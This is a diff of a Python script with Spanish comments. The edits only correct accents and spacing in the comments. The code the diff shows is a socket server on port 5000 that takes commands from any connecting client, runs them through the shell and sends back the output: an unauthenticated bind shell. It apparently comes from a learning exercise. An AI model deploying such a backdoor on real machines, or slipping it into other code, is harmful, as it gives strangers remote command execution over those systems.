@@ -3,19 +3,19 @@ from subprocess import getoutput
 from os import chdir, getcwd
 from time import sleep
 
-# Definimos la dirección y puerto, la direcion 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
+# Definimos la dirección y puerto, la dirección 0.0.0.0 hace referencia a que aceptamos conexiones de cualquier interfaz
 server_address = ('0.0.0.0', 5000)
 
 # Creamos el socket (la conexión)
 server_socket = socket()
 
-# Le pasamos la tupla donde especificamos donde escuchar
+# Le pasamos la tupla donde especificamos dónde escuchar
 server_socket.bind(server_address)
 
-# Cantidad de clientes maximos que se pueden conectar:
+# Cantidad de clientes máximos que se pueden conectar:
 server_socket.listen(1)
 
-# Esperamos a recibir una conexión y acceptarla:
+# Esperamos a recibir una conexión y aceptarla:
 client_socket, client_address = server_socket.accept()
 
 estado = True
@@ -37,7 +37,7 @@ while estado:
         chdir(" ".join(comando.split(" ")[1:]))
         client_socket.send("ruta actual: {}".format(getcwd()).encode())
     
-    else :
+    else:
         # Ejecutamos el comando y obtenemos su salida:
         salida = getoutput(comando)
 
